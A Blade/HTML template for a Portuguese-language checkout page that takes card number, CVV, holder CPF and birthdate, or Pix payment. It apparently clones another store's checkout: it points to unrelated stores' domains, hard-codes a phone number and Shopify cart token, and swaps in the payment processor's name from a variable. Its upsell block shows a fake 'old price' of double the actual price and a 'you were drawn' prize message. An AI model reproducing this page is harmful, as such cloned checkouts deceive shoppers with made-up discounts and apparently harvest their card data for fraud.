                                <a href="javascript:"  class="link-abs disabled" data-target=".box-checkout"></a>
                            </li>

                            <li class="checkout-step enabled">
                                <div class="connect" style="background: {{$data['cor_loja']}};"></div>
                                <div class="holder-icon" style="background: {{$data['cor_loja']}};">
                                    3
                                </div>
                                <div class="info">Pagamento</div>

                            </li>
                        </ul><!-- /.steps -->

                        <div class="clearfix col-checkout-holder">

                            <div class="col-checkout col-1">
                                <div
                                    class="box-checkout box-customer link-box-checkout"
                                    data-target=".box-customer"
                                    data-url=""
                                    data-next=".box-payment"
                                >

                                    <div class="box-title">
                                        <div class="holder-number">1</div><!-- /.holder-number -->
                                        <div class="title ctx-title f-h2 bold">
                                            Identifique-se
                                            <i class="icon-complete ml5 fa fa-check green"></i>
                                        </div><!-- /.f-h2 -->
                                        <div class="desc mb20">
                                            Utilizaremos seu e-mail para: Identificar seu perfil, histórico de compra, notificação de pedidos e carrinho de compras.
                                        </div>
                                    </div><!-- /.box-title -->

            <div class="infos black-80 f14">
    <div class="f16 medium mb10">
        {{$data['nome_completo']}}
    </div><!-- /.f16 -->
    <div class="mb5">{{$data['email']}}</div>
    <div>
        CPF
        <span class="cpf">
            {{$data['cpf']}}
        </span>
                                        </div>
                                        <div onclick="location.href('/checkout/1/{{$data['hash']}}/1')" class="edit">
                                            <span class="icon icon-pencil"></span>
                                            <span class="tooltip2">
    <div class="tt-content-holder" style="width: auto">
        <div class="tt-content bold text-center">
                            <div class="tt-line">
                    Editar
                </div>
                    </div>
    </div>
</span>    </div><!-- /.edit -->
                                    </div><!-- /.infos -->


                                    <div class="overlay-spinner overlay-spinner-box">
                                        <div class="spinner spinner-grey"></div><!-- /.spinner spinner-grey -->
                                    </div><!-- /.spinner-box -->
                                </div><!-- /.box-checkout -->


                                <div class="box-checkout box-addresses link-box-checkout" data-target=".box-addresses">
                                    <div class="box-title">
                                        <div class="holder-number">2</div><!-- /.holder-number -->
                                        <div class="title f-h2 ctx-title bold">
                                            Entrega
                                            <i class="icon-complete ml5 fa fa-check green"></i>
                                        </div><!-- /.f-h2 -->
                                        <div class="desc mb5 block">
                                            Cadastre ou selecione um endereço
                                        </div>
                                    </div><!-- /.box-title -->
                                    <div class="infos black-80 f14">
                                        <span class="medium mb5 block">Endereço para entrega:</span>
                                        {{$data['rua']}}, {{$data['numero']}} - {{$data['bairro']}} <br>


                                        CEP <span class="zipcode">{{$data['cep']}}</span>

                                        <span class="medium mb5 mt15 block">Forma de entrega:</span>
                                        <span>
					{{$data['frete_selecionado']}}
											- {{ $data['frete_selecionado_valor'] == null || $data['frete_selecionado_valor'] == 0 ? 'Grátis' : 'R$ ' . str_replace('.', ',', $data['frete_selecionado_valor']) }}

									</span>
                                        <div class="edit" onclick="location.href('/checkout/1/{{$data['hash']}}/1')">
                                            <span class="icon icon-pencil"></span>
                                            <span class="btn-label -mobile -block bold f9 mt3 black-40">Editar</span>
                                            <span class="-desktop">
                    <span class="tooltip2">
    <div class="tt-content-holder" style="width: auto">
        <div class="tt-content bold text-center">
                            <div class="tt-line">
                    Editar
                </div>
                    </div>
    </div>
</span>                </span>
                                        </div><!-- /.edit -->
                                    </div><!-- /.infos -->


                                    <div class="overlay-spinner overlay-spinner-box">
                                        <div class="spinner spinner-grey"></div><!-- /.spinner spinner-grey -->
                                    </div><!-- /.spinner-box -->
                                </div><!-- /.box-checkout -->
                            </div><!-- /.col-checkout -->

                            <div class="col-checkout col-2">
                                <div class="box-checkout box-payment active" data-target=".box-payment" >

                                    <div class="box-title">
                                        <div class="holder-number">3</div><!-- /.holder-number -->
                                        <div class="title f-h2 ctx-title bold">Pagamento</div><!-- /.f-h2 -->
                                        <div class="desc">
                                            Escolha uma forma de pagamento
                                        </div>
                                    </div><!-- /.box-title -->

                                    <div class="box-content">
                                        <div class="form-horizontal clearfix text-left">


                                            <div class="payments">
                                                <div class="clearfix mercadopago-flag mercadopago-element">
                                                    <div class="inline-block mt20 mb2">
                                                        <span class="text mr5 f12 black-80">Processado por</span>
                                                        <div class="icon icon-mercadopago"></div><!-- /.icon icon-mercadopago -->
                                                    </div><!-- /.mercadopago-flag mercadopago-element icon icon-mercadopago -->
                                                </div><!-- /.text-center clearfix -->
                                                @if($data['cc'])
                                                    <div class="payment payment-trigger pagamento_cartao box-0">
                                                        <label for="payment-credit-card" class="payment-header block clearfix">
                                                            <div class="holder-icheck pull-left">
                                                                <div class="iradio_minimal" style="position: relative;">
                                                                    </ins></div>
                                                                <label for="pagamento_cartao" aba="cartao" class="holder-label medium f14 black-80 label-credit-card labels_pagamento">
                                                                    <span class="name">Cartão de crédito</span>
                                                                    <div class="card-brands-payment cards mt10">
                                                                        <img src="https://github.bubbstore.com/svg/card-amex.svg" height="20" alt="American Express" class="card-icon">
                                                                        <img src="https://github.bubbstore.com/svg/card-visa.svg" height="20" alt="Visa" class="card-icon">
                                                                        <img src="https://github.bubbstore.com/svg/card-diners.svg" height="20" alt="Diners" class="card-icon">
                                                                        <img src="https://github.bubbstore.com/svg/card-mastercard.svg" height="20" alt="Mastercard" class="card-icon">
                                                                        <img src="https://github.bubbstore.com/svg/card-discover.svg" height="20" alt="Discover" class="card-icon">
                                                                        <img src="https://github.bubbstore.com/svg/card-aura.svg" height="20" alt="Aura" class="card-icon">
                                                                        <img src="https://github.bubbstore.com/svg/card-hipercard.svg" height="20" alt="Hipercard" class="card-icon">
                                                                    </div>
                                                                </label>
                                                            </div>
                                                        </label>
                                                        <div class="payment-content payment-content-creditcard clearfix" id="conteudo_cartao">
                                                            <div class="inner-form">
                                                                <div id="creditcard-single" class="creditcard-content">
                                                                    <div id="creditcard-container-1" class="creditcard-container clearfix" data-index="0">
               <span data-hj-masked="" data-hj-suppress="" data-clarity-mask="True" data-mf-replace="**REMOVED**">
                  <div class="card-wrapper"></div>
                   <!-- /.card-wrapper -->
               </span>
                                                                        <div class="form-group w-100">
                                                                            <label for="input-card-number" class="label-control block">Número do cartão</label>
                                                                            <input type="tel" data-name="card[0][number]" data-checkout="cardNumber" id="input-card-number-0" class="bold l-space1 input-validate required input input-card-number bincreditcard" data-iugu="number" data-url="https://seguro.churrasking.com.br/api/v1/installments" placeholder="1234 1234 1234 1234" data-testid="input-cc-number">
                                                                            <div id="input-card-number-0_errors" class="error-block"></div>
                                                                            <!-- /.error-block -->
                                                                        </div>
                                                                        <!-- /.form-group w-100 -->
                                                                        <div class="form-group w-50 keep-size -padding-right">
                                                                            <label for="input-card-validaty" class="label-control block">Validade <span class="f11 black-60">(mês/ano)</span></label>
                                                                            <div class="relative">
                                                                                <input type="tel" data-iugu="expiration" data-name="card[0][expiry]" id="input-card-validaty-0" class="input-validate required input input-card-expiry mindate" data-testid="input-cc-expiration" placeholder="MM/AA" maxlength="7">
                                                                                <div class="holder-help">
                                                                                    <i class="fa fa-question-circle"></i>
                                                                                    <div class="holder-tooltip">
                                                                                        <div class="tooltip">
                                                                                            <p class="f11">
                                                                                                Validade do seu cartão. <br>
                                                                                                Exemplo: 10/19 <br><br>
                                                                                                Onde <strong>10</strong> é o mês e <strong>19</strong> é o ano
                                                                                            </p>
                                                                                            <!-- /.f11 -->
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                            <!-- /.relative -->
                                                                            <div id="input-card-validaty-0_errors" class="error-block"></div>
                                                                            <!-- /.error-block -->
                                                                        </div>
                                                                        <!-- /.form-group -->
                                                                        <div class="form-group w-50 keep-size -padding-left">
                                                                            <label for="input-security-number" class="label-control -nowrap block">
                                                                                Cód. de segurança
                                                                                <span class="relative holder-tooltip ml2">
                        <i class="icon icon-question-tip"></i>
                        <span class="tooltip2">
                           <div class="tt-content-holder" style="width: 101px">
                              <div class="tt-content bold text-center">
                                 <div class="tt-line">
                                    3 dígitos no verso do cartão. Amex: 4 dígitos na frente.
                                 </div>
                              </div>
                           </div>
                        </span>
                     </span>
                                                                            </label>
                                                                            <div class="relative">
                                                                                <input type="tel" data-name="card[0][cvv]" data-checkout="securityCode" id="input-security-number-0" class="input-validate required input input-card-security-number maxlength" maxlength="4" data-testid="input-cc-sec-code">
                                                                                <div class="holder-help">
                                                                                    <i class="fa fa-question-circle"></i>
                                                                                    <div class="holder-tooltip">
                                                                                        <div class="tooltip">
                                                                                            <div class="icon security-number"></div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                            <!-- /.relative -->
                                                                            <div id="input-security-number-0_errors" class="error-block"></div>
                                                                            <!-- /.error-block -->
                                                                        </div>
                                                                        <!-- /.form-group -->
                                                                        <div class="form-group w-100">
                                                                            <label id="input-card-name" for="input-card-name" class="label-control block">Nome e sobrenome do titular</label>
                                                                            <input type="text" data-iugu="full_name" data-name="card[0][holder_name]" data-checkout="cardholderName" id="input-card-name-0" class="input-validate required input input-card-name" placeholder="ex.: Maria de Almeida Cruz" data-testid="input-cc-card-name">
                                                                            <div id="input-card-name-0_errors" class="error-block"></div>
                                                                            <!-- /.error-block -->
                                                                        </div>
                                                                        <!-- /.form-group -->
                                                                        <div class="form-group w-62 keep-size">
                                                                            <label for="input-card-name" class="label-control block">CPF do titular</label>
                                                                            <input type="tel" id="input-card-document-0" class="input-validate required input input-card-document cpf" data-name="card[0][holder_document]" value="" data-checkout="docNumber" data-testid="input-cc-document" placeholder="000.000.000-00" required="" maxlength="14">
                                                                            <div id="input-card-document-0_errors" class="error-block"></div>
                                                                            <!-- /.error-block -->
                                                                        </div>
                                                                        <!-- /.form-group -->
                                                                        <div class="form-group w-62 hide moip-element pagseguro-element keep-size">
                                                                            <label for="input-card-name" class="label-control block">Nascimento do titular</label>
                                                                            <input type="tel" id="input-card-birthdate-0" class="input-validate required input input-card-birthdate date" data-name="card[0][holder_birthdate]" data-checkout="holderBirthdate" placeholder="00/00/0000" value="" maxlength="10">
                                                                            <div id="input-card-birthdate-0_errors" class="error-block"></div>
                                                                            <!-- /.error-block -->
                                                                        </div>
                                                                        <!-- /.form-group -->
                                                                        <input type="hidden" data-name="card[0][year]" data-checkout="cardExpirationYear">
                                                                        <input type="hidden" data-name="card[0][month]" data-checkout="cardExpirationMonth">
                                                                        <input type="hidden" data-name="card[0][gateway]" class="gateway">
                                                                        <input type="hidden" data-name="card[0][affiliationId]" class="affiliation-id">
                                                                        <input type="hidden" id="brand" data-name="card[0][brand]">
                                                                        <input type="hidden" class="fake-card-number" value="411111">
                                                                        <div class="form-group form-group-installments w-100">
                                                                            <label for="input-parcels-number" class="label-control block">
                                                                                Nº de Parcelas
                                                                            </label>
                                                                            <div class="holder-installments">
                                                                                <div class="holder-selectskin">
                                                                                    <div class="select-skin">
                                                                                        <select id="installments" data-testid="input-cc-installments" data-name="card[0][installments]" class="selectskin installments" style="width: 100%; opacity: 0;"></select>
                                                                                        <div class="select-skin-mask">
                                                                                            <div class="select-skin-text-clip">
                                                                                                <div class="select-skin-text"></div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                                <!-- /.holder-select -->
                                                                                <div class="error-block"></div>
                                                                                <!-- /.error-block -->
                                                                                <span class="black-60 f11 block mt5 regular mb5 installments-helper js-installments-helper">Preencha o cartão para selecionar as parcelas</span>
                                                                                <div class="mt5 installments-rate-warning f11 black-60 hide">* há um acréscimo de <span class="tax"></span>%<span class="tax-monthly"> ao mês</span>.</div>
                                                                            </div>
                                                                        </div>
                                                                        <!-- /.form-group -->
                                                                        <input type="hidden" data-name="card[0][customerphone]" value="(21) 95128-7512">
                                                                        <input type="hidden" id="docType" data-name="card[0][docType]" data-checkout="docType" value="CPF">						<input type="hidden" id="amount" class="input-amount" data-name="card[0][amount]" value="172,90">
                                                                    </div>
                                                                    <!-- /.creditcard-container -->
                                                                </div>
                                                                <!-- /.creditcard-content -->
                                                            </div>
                                                            <!-- /.inner-form -->
                                                            <div class="js-orderbumps"></div>
                                                            <div class="mt10 holder-buy-button">
                                                                <button type="submit" id="btn_compra_cc" data-testid="buy-now-cc" style="background-color: {{$data['cor_loja']}}" class="btn btn-primary btn-block btn-send btn-finalize with-icon">Comprar agora</button>
                                                            </div>
                                                            <!-- /.form-group -->
                                                        </div>
                                                        <!-- /.payment-content -->
                                                        <div class="overlay-spinner overlay-spinner-payment">
                                                            <div class="spinner spinner-grey"></div>
                                                            <!-- /.spinner spinner-grey -->
                                                        </div>
                                                        <!-- /.spinner-box -->
                                                    </div>

                                                @endif


                                                <div class="payment payment-trigger pix box-10" data-affiliation="mercadopago">
                                                    <label for="pagamento_pix" class="payment-header block clearfix labels_pagamento" aba="pix">
                                                        <div class="holder-icheck pull-left">
                                                            <input type="radio" id="pagamento_pix" class="radio_pagamento">
                                                            <label for="pagamento_pix" class="holder-label medium f12 black-80">
                                                                <i class="icon icon-pix mr3"></i>
                                                                Pix
                                                            </label>
                                                        </div>
                                                    </label>

                                                    <div class="payment-content" id="conteudo_pix">
                                                        <div class="pix-desc mt5 mb20 medium f13 black-80">
                                                            <p>
                                                                A confirmação de pagamento é realizada em poucos minutos.
                                                                Utilize o aplicativo do seu banco para pagar.
                                                            </p>
                                                        </div><!-- /.mt10 -->

                                                        <div class="pix-price f16 bold mb10" style="color: {{$data['cor_loja']}};">
                                                            Valor no Pix: <span id="valor_card_pix"></span>
                                                        </div>

                                                        <div class="js-orderbumps">
                                                            @if($bumpProducts->isNotEmpty() && $data['orderbump'] == 'n')
                                                                <div class="holder_orderbumps">
                                                                    <div class="orderbumps_flex -center ">
                                                                        <div class="orderbumps_offer-total flex hcenter shake">
                                                                            <span class="emoji">🎉</span>
                                                                            VOCÊ TEM {{ $bumpProducts->count() }} OFERTA!
                                                                        </div>
                                                                        <div class="orderbumps_owl-navigation hide">
                                                                            <div class="owl-navigation_button prev js-owl-navigation_button js-btn-orderbump-owl-nav-prev">
                                                                                <i class="icon icon-next-prev -rotate"></i>
                                                                            </div>
                                                                            <div class="owl-navigation_button next js-owl-navigation_button js-btn-orderbump-owl-nav-next">
                                                                                <i class="icon icon-next-prev"></i>
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    @foreach($bumpProducts as $bumpProduct)
                                                                        <div class="orderbumps owl-orderbumps js-owl-orderbumps">
                                                                            <div class="orderbump js-orderbump " data-order-bump-id="120349" data-product-option-id="111308157" data-item-id="16497705">
                                                                                <div class="orderbump_product">
                                                                                    <div>
                                                                                        <img src="{{$bumpProduct['image']}}" alt="{{$bumpProduct['title']}}" loading="lazy" class="orderbump_product-image">
                                                                                    </div>
                                                                                    <div class="orderbump_product-details">
                                                                                        <div class="orderbump_product-name">{{$bumpProduct['title']}}</div>

                                                                                        <div class="orderbump_holder-price">
                                                                                            <span class="orderbump_old-price mr5">R$ {{str_replace('.', ',', number_format($bumpProduct['actual_price'] * 2,2) )}}</span>
                                                                                            <span class="orderbump_price bold">R$ {{str_replace('.', ',', number_format($bumpProduct['offer_price'],2) )}}</span>
                                                                                        </div>

                                                                                    </div>
                                                                                </div>
                                                                                <div class="orderbump_title" style="text-align: center;">
                                                                                    VOCÊ FOI SORTEADO!
                                                                                </div>
                                                                                <div class="orderbump_message">
                                                                                    Aproveite esta promoção especial, adicione esta oferta ao seu carrinho.
                                                                                </div>

                                                                                <div class="orderbump_button" bump-product-id="{{ $bumpProduct['id'] }}" style="display: flex; justify-content: center; background-color: #269c26 !important;">
                                                                                    <div class="orderbump_button-cta medium white">+ Adicionar oferta</div>
                                                                                </div>

                                                                                <div class="orderbump_disclaimer black-60">
                                                                                    <div class="orderbump_disclaimer-title bold f10">
                                                                                        Porque você está comprando:
                                                                                    </div>
                                                                                    <div class="orderbump_disclaimer-message mt5 f12">
                                                                                        {{$bumpProduct['title']}}
                                                                                    </div>
                                                                                </div>
                                                                                <div class="overlay-spinner overlay-spinner-account hide">
                                                                                    <div class="spinner spinner-grey"></div><!-- /.spinner spinner-grey -->
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    @endforeach
                                                                </div>
                                                            @endif
                                                        </div>


                                                        <div class="mt20">
                                                            <button type="submit" style="background: {{$data['cor_loja']}};" id="btn_pagamento_pix" class="btn btn-primary btn-block btn-send btn-finalize with-icon">
                                                                Comprar agora
                                                            </button>
                                                        </div><!-- /.form-group -->

                                                    </div><!-- /.payment-content -->
                                                    <div class="overlay-spinner overlay-spinner-payment">
                                                        <div class="spinner spinner-grey"></div><!-- /.spinner spinner-grey -->
                                                    </div><!-- /.spinner-box -->
                                                </div><!-- /.payment -->



                                                <input type="hidden" name="gateway" value="mercadopago">
                                            </div><!-- /.payments -->

                                            <input type="hidden" data-name="_token" value="FIa4DC6c2dzKQYTFe8x0rKxYsEsGonB2IQs4fldb" />
                                            <input type="hidden" data-name="cart_token" value="shopify-335233c33b52253e2e48f95bcaa3301c" />

                                        </div>
                                    </div><!-- /.box-content -->

                                    <div class="overlay-spinner overlay-spinner-box">
                                        <div class="spinner spinner-grey"></div><!-- /.spinner spinner-grey -->
                                    </div><!-- /.spinner-box -->
                                </div><!-- /.box-checkout -->			</div><!-- /.col-checkout -->

                            <!-- Products card start -->
                            <div class="col-checkout col-3">
                                <div class="box-checkout box-resume ">
                                    <div class="box-title flex between js-box-resume-title">
                                        <div class="c-text">
                                            <span class="-title f18 medium">
                                                RESUMO
                                            </span>
                                            <span class="items__count bold -mobile" id="contador_qtd">
                                                ({{ $products->sum('quantidade') }})
                                            </span>
                                            <div class="resume-description f11 black-60 mt2 -mobile -block">Informações da sua compra</div>
                                        </div>
                                        <!-- /.f-h2 -->
                                        <div>
                                            <span class="cart_total -mobile mt7">
                                                <span class="-total" style="color: {{ $data['cor_loja'] }};">
                                                    R$ {{ number_format(($baseTotalPrice), 2, ',') }}
                                                </span>
                                                <i class="icon icon-arrow-left"></i>
                                            </span>
                                        </div>
                                    </div>
                                    <!-- /.box-title -->
                                    <div class="js-box-animation box-animation">
                                        <div class="box-content clearfix mt15">
                                            <div class="clearfix holder-promocode">
                                                <form action="https://seguro.lojaliford.com/cart/promocode/store" id="form-promocode" method="post" class="form-promocode form-horizontal">
                                                    <div class="form-group w-100">
                                                        <div class="clearfix">
                                                            <label for="promocode" class="label-control block">
                                                                Tem um cupom?
                                                            </label>

                                                            <i class="block icon-promocode"></i>

                                                            <div class="flex">
                                                                <input type="text" name="code" id="promocode" placeholder="Código do cupom" class="input input-promocode pull-left" value="" required>
                                                                <button type="submit" class="btn btn-tertiary btn-h36">
                                                                    Adicionar
                                                                </button>
                                                            </div>
                                                            <div class="spinner-grey spinner-promocode"></div>
                                                        </div>
                                                        <!-- /.clearfix -->
                                                        <div class="c-error f10 mt5 mb5 promocode-error"></div>

                                                    </div>
                                                    <!-- /.form-group -->

                                                    <input type="hidden" name="_token" value="YfSYRy58SsgAVJEUbv4pPj9FbTr54mjAbTBZUYkv">

                                                </form>
                                            </div>
                                            <!-- /.clearfix -->

                                            <div class="cart-resume mt10">
                                                <div class="detail">
                                                    <div class="description">Produtos</div>
                                                    <div id="vl_produto_lista" valor="" class="value">R$ {{ number_format(($baseTotalPrice), 2, ',') }}</div>
                                                </div>

                                                <div class="detail total bold" style="color: {{$data['cor_loja']}};">
                                                    <div class="description">
                                                        Total
                                                    </div>
                                                    <div class="value js-cart-total" id="valor_total">
                                                        R$ {{ number_format(($baseTotalPrice), 2, ',') }}
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="holder-container-resume js-holder-container-resume">
                                                @foreach($products as $product)
                                                    <div class="item-holder js-item-holder flex  " data-item-id="481990080" data-product-option-id="117664268" data-kit-id="" data-quantity="1" data-custom="" data-shopify-variant-id="45170425266481" data-bundle-id="" data-shopify="1" data-order-bump-id="">
                                                        <div class="overlay-spinner overlay-spinner-box">
                                                            <div class="spinner spinner-grey"></div>
                                                            <!-- /.spinner-grey -->
                                                        </div>

                                                        <div class="item-image">
                                                            <img src="{{ $product['imagem1'] }}" alt="{{ $product['titulo'] }}" class="thumb-product block" />
                                                        </div>

                                                        <div class="item-detail f12">
                                                            <div class="item-row">
                                                                <div class="item-name c-text-tertiary">{{ $product['titulo'] }}</div>
                                                                <div class="item-delete"></div>
                                                            </div>

                                                            @php
                                                                if(!is_null($product['variacao'])){
                                                                    $variacao = explode('|', $product['variacao']);
                                                                    array_pop($variacao);
                                                                    echo '<div style="display: flex; flex-direction: column;" class="item-row bold c-text-secondary">';
                                                                    foreach($variacao as $i => $v){
                                                                        echo '<span class="item-variation">' . $v . '</span>';
                                                                    }
                                                                    echo '</div>';
                                                                }
                                                            @endphp

                                                            <div class="item-row item-holder-quantity-price c-text medium">
                                                                <span class="item-price"> R$ {{ number_format($product['preco'], 2, ',') }}</span><br>
                                                            </div>

                                                            {{--                                                            <div class="item-row">--}}
                                                            {{--                                                                <div class="item-quantity-selector-holder js-item-quantity-selector-holder">--}}
                                                            {{--                                                                    <div class="relative">--}}
                                                            {{--                                                                        <a href="javascript:" class="switch-control less">--}}
                                                            {{--                                                                            <i class="icon icon-less"></i>--}}
                                                            {{--                                                                        </a>--}}

                                                            {{--                                                                        <a href="javascript:" class="switch-control more">--}}
                                                            {{--                                                                            <i class="icon icon-more"></i>--}}
                                                            {{--                                                                        </a>--}}
                                                            {{--                                                                        <input type="text" class="input-quantity js-input-quantity " id="input_valor" value="{{ $product['quantidade'] }}">--}}
                                                            {{--                                                                    </div>--}}
                                                            {{--                                                                    <div class="error-item red f11 hide text-center"></div>--}}
                                                            {{--                                                                </div>--}}
                                                            {{--                                                            </div>--}}

                                                        </div>

                                                    </div>
                                                @endforeach
                                            </div>
                                            <!-- /.holder-container-resume -->
                                        </div>
                                        <!-- /.box-content -->
                                    </div>

                                    <div class="overlay-spinner overlay-spinner-box">
                                        <div class="spinner spinner-grey"></div>
                                        <!-- /.spinner spinner-grey -->
                                    </div>
                                    <!-- /.spinner-box -->
                                </div>
                            </div>
                            <!-- Products card ends -->

                            <div class="col-checkout col-4">
                                <div class="container-testimonials">
                                    <div class="testimonials">
                                        <div class="box-testimonial clearfix">
                                            <div class="box-testimonial__photo pull-left ml20">
                                                <img src="/logobanco/{{$data['logo']['img']}}.png" alt="mercadopago" class="photo">
                                            </div><!-- /.box-testimonial__photo -->
                                            <div class="box-testimonial__infos pull-left ml15">
                                                <div class="infos__rating mt5 mb5">
                                                    <i class="fa fa-star yellow"></i>
                                                    <i class="fa fa-star yellow"></i>
                                                    <i class="fa fa-star yellow"></i>
                                                    <i class="fa fa-star yellow"></i>
                                                    <i class="fa fa-star yellow"></i>
                                                </div>
                                                <strong class="infos__name  black-60">{{$data['logo']['texto']}}</strong>
                                                <p class="infos__text black-60">
                                                    Nossos pagamentos são administrados por {{$data['logo']['texto']}}, lider em plataformas de pagamentos online no Brasil. Sua compra está 100% segura.</p>
                                            </div><!-- /.box-testimonial__infos -->
                                        </div><!-- /.box-testimonial -->
                                        <div class="box-testimonial clearfix">
                                            <div class="box-testimonial__photo pull-left ml20">
                                                <img src="//images.yampi.me/assets/stores/liord2/uploads/testimonies/6449f95a59519.jpeg" alt="Entrega Segura" class="photo">
                                            </div><!-- /.box-testimonial__photo -->
                                            <div class="box-testimonial__infos pull-left ml15">
                                                <div class="infos__rating mt5 mb5">
                                                    <i class="fa fa-star yellow"></i>
                                                    <i class="fa fa-star yellow"></i>
                                                    <i class="fa fa-star yellow"></i>
                                                    <i class="fa fa-star yellow"></i>
                                                    <i class="fa fa-star yellow"></i>
                                                </div>
                                                <strong class="infos__name  black-60">Entrega Segura</strong>
                                                <p class="infos__text black-60">Entrega segura e rastreável, após a compra você receberá em seu e-mail um código para acompanhar seu pedido até que receba.</p>
                                            </div><!-- /.box-testimonial__infos -->
                                        </div><!-- /.box-testimonial -->
                                        <div class="box-testimonial clearfix">
                                            <div class="box-testimonial__photo pull-left ml20">
                                                <img src="//images.yampi.me/assets/stores/liord2/uploads/testimonies/644c71e015a13.png" alt="Garantia de Reembolso" class="photo">
                                            </div><!-- /.box-testimonial__photo -->
                                            <div class="box-testimonial__infos pull-left ml15">
                                                <div class="infos__rating mt5 mb5">
                                                    <i class="fa fa-star yellow"></i>
                                                    <i class="fa fa-star yellow"></i>
                                                    <i class="fa fa-star yellow"></i>
                                                    <i class="fa fa-star yellow"></i>
                                                    <i class="fa fa-star yellow"></i>
                                                </div>
                                                <strong class="infos__name  black-60">Garantia de Reembolso</strong>
                                                <p class="infos__text black-60">Receba sua compra como esperava ou reembolsaremos 100% o valor do seu pedido de volta direto na sua conta em poucos minutos.</p>
                                            </div><!-- /.box-testimonial__infos -->
                                        </div><!-- /.box-testimonial -->
                                    </div><!-- /.owl-carousel owl-testimonials -->
                                </div><!-- /.container clearfix -->
                            </div><!-- /.col-checkout -->

                        </div><!-- /.clearfix -->
                    </div><!-- /.holder-cols-checkout -->
                </div><!-- /.container-promocode -->

{{--                <script>--}}
{{--                    window.checkout.cart = {--}}
{{--                        id: 351260355,--}}
{{--                        customer_id: 148572890,--}}
{{--                        token: 'shopify-335233c33b52253e2e48f95bcaa3301c',--}}
{{--                        optionsIds: ['8450500755761'],--}}
{{--                        skusIds: ['121671212'],--}}
{{--                        isShopify: true,--}}
{{--                        prices: {"items_amount":249.8,"total_items":"1","subtotal":79,"discount":0,"items_discount":170.8,"shipment":0,"shipment_original_value":"0.00","shipment_discount_value":0,"shipment_discount_percent":"0,00","promocode_discount_value":0,"progressive_discount_value":0,"kits_discount_value":0,"total":79,"value_for_free_shipment":0,"installments":{"max_installment":12,"max_installment_value":7.93,"amount":95.18,"text":"12x de R$ 7,93 *","text_with_tax":"12x de R$ 7,93","text_discount_percent":null,"text_discount":null,"installments":[{"amount":79,"amount_formated":"R$ {{str_replace('.',',',$data['preco'])}}","base_value":79,"tax":"0.00","tax_value":0,"discount_percent":0,"discount_value":0,"discount_value_formated":"R$ 0,00","installment":1,"installment_value":79,"installment_value_formated":"R$ {{str_replace('.',',',$data['preco'])}}","text":"1x de R$ {{str_replace('.',',',$data['preco'])}}","text_with_tax":"1x de R$ {{str_replace('.',',',$data['preco'])}}","text_discount_percent":null,"text_discount":null},{"amount":82.56,"amount_formated":"R$ 82,56","base_value":79,"tax":"2.99","tax_value":3.560546618059931,"discount_percent":0,"discount_value":-3.56,"discount_value_formated":"R$ -3,56","installment":2,"installment_value":41.28,"installment_value_formated":"R$ 41,28","text":"2x de R$ 41,28 *","text_with_tax":"2x de R$ 41,28","text_discount_percent":null,"text_discount":null},{"amount":83.77,"amount_formated":"R$ 83,77","base_value":79,"tax":"2.99","tax_value":4.770587626636498,"discount_percent":0,"discount_value":-4.77,"discount_value_formated":"R$ -4,77","installment":3,"installment_value":27.92,"installment_value_formated":"R$ 27,92","text":"3x de R$ 27,92 *","text_with_tax":"3x de R$ 27,92","text_discount_percent":null,"text_discount":null},{"amount":84.99,"amount_formated":"R$ 84,99","base_value":79,"tax":"2.99","tax_value":5.992217995627527,"discount_percent":0,"discount_value":-5.99,"discount_value_formated":"R$ -5,99","installment":4,"installment_value":21.25,"installment_value_formated":"R$ 21,25","text":"4x de R$ 21,25 *","text_with_tax":"4x de R$ 21,25","text_discount_percent":null,"text_discount":null},{"amount":86.23,"amount_formated":"R$ 86,23","base_value":79,"tax":"2.99","tax_value":7.225430687253976,"discount_percent":0,"discount_value":-7.23,"discount_value_formated":"R$ -7,23","installment":5,"installment_value":17.25,"installment_value_formated":"R$ 17,25","text":"5x de R$ 17,25 *","text_with_tax":"5x de R$ 17,25","text_discount_percent":null,"text_discount":null},{"amount":87.47,"amount_formated":"R$ 87,47","base_value":79,"tax":"2.99","tax_value":8.470216660416938,"discount_percent":0,"discount_value":-8.47,"discount_value_formated":"R$ -8,47","installment":6,"installment_value":14.58,"installment_value_formated":"R$ 14,58","text":"6x de R$ 14,58 *","text_with_tax":"6x de R$ 14,58","text_discount_percent":null,"text_discount":null},{"amount":88.73,"amount_formated":"R$ 88,73","base_value":79,"tax":"2.99","tax_value":9.726564876290837,"discount_percent":0,"discount_value":-9.73,"discount_value_formated":"R$ -9,73","installment":7,"installment_value":12.68,"installment_value_formated":"R$ 12,68","text":"7x de R$ 12,68 *","text_with_tax":"7x de R$ 12,68","text_discount_percent":null,"text_discount":null},{"amount":89.99,"amount_formated":"R$ 89,99","base_value":79,"tax":"2.99","tax_value":10.994462305145845,"discount_percent":0,"discount_value":-10.99,"discount_value_formated":"R$ -10,99","installment":8,"installment_value":11.25,"installment_value_formated":"R$ 11,25","text":"8x de R$ 11,25 *","text_with_tax":"8x de R$ 11,25","text_discount_percent":null,"text_discount":null},{"amount":91.27,"amount_formated":"R$ 91,27","base_value":79,"tax":"2.99","tax_value":12.273893934390998,"discount_percent":0,"discount_value":-12.27,"discount_value_formated":"R$ -12,27","installment":9,"installment_value":10.14,"installment_value_formated":"R$ 10,14","text":"9x de R$ 10,14 *","text_with_tax":"9x de R$ 10,14","text_discount_percent":null,"text_discount":null},{"amount":92.56,"amount_formated":"R$ 92,56","base_value":79,"tax":"2.99","tax_value":13.564842777828474,"discount_percent":0,"discount_value":-13.56,"discount_value_formated":"R$ -13,56","installment":10,"installment_value":9.26,"installment_value_formated":"R$ 9,26","text":"10x de R$ 9,26 *","text_with_tax":"10x de R$ 9,26","text_discount_percent":null,"text_discount":null},{"amount":93.87,"amount_formated":"R$ 93,87","base_value":79,"tax":"2.99","tax_value":14.867289886107741,"discount_percent":0,"discount_value":-14.87,"discount_value_formated":"R$ -14,87","installment":11,"installment_value":8.53,"installment_value_formated":"R$ 8,53","text":"11x de R$ 8,53 *","text_with_tax":"11x de R$ 8,53","text_discount_percent":null,"text_discount":null},{"amount":95.18,"amount_formated":"R$ 95,18","base_value":79,"tax":"2.99","tax_value":16.181214358367328,"discount_percent":0,"discount_value":-16.18,"discount_value_formated":"R$ -16,18","installment":12,"installment_value":7.93,"installment_value_formated":"R$ 7,93","text":"12x de R$ 7,93 